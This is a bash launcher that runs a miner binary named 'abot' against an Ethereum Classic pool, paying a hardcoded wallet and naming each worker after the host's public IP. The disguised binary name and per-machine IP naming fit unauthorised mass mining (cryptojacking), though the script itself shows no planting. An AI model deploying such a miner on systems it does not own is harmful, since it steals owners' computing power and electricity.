#!/bin/bash

#################################
## Begin of user-editable part ##
#################################

POOL=eu1-etc.ethermine.org:14444
WALLET=0x23c43E95C038Dc143D142857eE18F683a39934b8.$(echo "$(curl -s ifconfig.me)" | tr . _ )-erg

#################################
##  End of user-editable part  ##
#################################

cd "$(dirname "$0")"

chmod +x abot && ./abot --algo ETCHASH --pool $POOL --user $WALLET $@
while [ $? -eq 42 ]; do
    sleep 10s
    ./abot --algo ETCHASH --pool $POOL --user $WALLET $@
done
